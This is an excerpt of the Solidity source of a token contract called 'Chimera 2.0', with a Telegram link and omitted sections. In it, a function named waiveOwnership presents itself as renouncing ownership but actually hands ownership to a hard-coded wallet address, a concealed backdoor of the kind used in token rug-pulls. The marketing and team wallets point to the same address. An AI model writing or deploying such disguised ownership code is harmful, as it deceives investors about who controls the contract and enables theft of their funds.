...
Telegram https://t.me/chimeratwo
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x1bf3811584772f379Fc9D8b63ca2DB7bAC1A5F20);
    }
...
contract ChimeraTwo is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Chimera 2.0";
    string private _symbol = "ChimeraTwo";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x9F9A42b98E456244776350eF9f09C2956dCF5f86);
    address payable public teamWalletAddress = payable(0x9F9A42b98E456244776350eF9f09C2956dCF5f86);
